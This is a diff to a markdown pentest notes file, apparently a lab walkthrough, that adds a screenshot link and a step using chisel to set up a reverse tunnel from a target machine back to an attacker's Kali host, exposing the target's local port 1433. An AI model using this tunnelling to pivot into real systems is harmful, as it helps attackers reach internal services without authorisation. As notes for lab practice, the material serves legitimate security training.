@@ -147,6 +147,7 @@ rpcclient $>
 ![image](https://github.com/user-attachments/assets/b5d06cca-83ee-4650-b5a5-02f4f0492012)
 ![image](https://github.com/user-attachments/assets/0b28c01b-8d3f-4906-a19d-26408855c8d6)
 ![image](https://github.com/user-attachments/assets/8d914551-5f15-4147-9dbd-22513a77b6da)
+![image](https://github.com/user-attachments/assets/63fcf5cf-8627-4316-8eb2-9490d13a5e32)
 
 Take a break.
 
@@ -217,4 +218,12 @@ While some versions of rpcclient might support changing passwords using setuseri
 
 21. netstat -ano | findstr LISENTING --> check open ports --> port 1433 is listening
 
-22. 
+22. port forwarding:
+````
+# kali machine
+chisel server --port 445 --reverse
+# target machine
+cmd /c chisel.exe <serverIP:port> R:<kali port to forward to>:127.0.0.1:<local port to forward>
+chisel.exe client $KaliIP:445 R:1433:127.0.0.1:1433
+````
+23. 
